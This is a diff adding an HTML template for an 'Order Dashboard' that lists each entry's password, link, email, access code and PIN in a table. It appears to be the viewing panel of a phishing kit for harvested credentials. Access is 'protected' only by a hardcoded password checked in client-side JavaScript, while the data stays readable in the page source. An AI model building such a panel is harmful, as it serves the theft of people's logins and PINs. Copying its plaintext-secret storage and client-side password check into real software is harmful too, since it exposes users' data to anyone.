@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            display: none; /* Hide the table initially */
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #f0f0f0;
+        }
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+        /* Popup overlay (background) */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Make sure the popup is on top of other content */
+        }
+
+        /* Popup content box */
+        .popup-content {
+            background-color: #f9f9f9;
+            padding: 30px 40px;
+            width: 400px;
+            max-width: 90%;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            position: relative;
+            text-align: left;
+        }
+
+        /* Popup header styling */
+        .popup-title {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #f8b400;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #ffbf00;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Order Dashboard</h1>
+    <table id="orderTable">
+        <tr>
+            <th>Order ID</th>
+            <th>Password</th>
+            <th>Big Link</th>
+            <th>Email</th>
+            <th>Access Code</th>
+            <th>Pin Code</th>
+        </tr>
+        {% for order in orders %}
+        <tr>
+            <td>{{ order.order_id }}</td>
+            <td>{{ order.password or 'None' }}</td>
+            <td>{{ order.big_link or 'None' }}</td>
+            <td>{{ order.email }}</td>
+            <td>{{ order.access_code }}</td>
+            <td>{{ order.pin_code }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+
+    <script>
+        // Set the authentication password (replace with your desired password)
+        const authPassword = 'Dikzakjes505'; // Set a real password here
+
+        // Prompt the user for authentication
+        const userPassword = prompt('Please enter the password to access this page.');
+
+        // Check if the user entered the correct password
+        if (userPassword === authPassword) {
+            // Show the table if the password is correct
+            document.getElementById('orderTable').style.display = 'table';
+        } else {
+            // Show an error message if the password is incorrect
+            alert('Incorrect password. Access denied.');
+
+        }
+    </script>
+</body>
+</html>
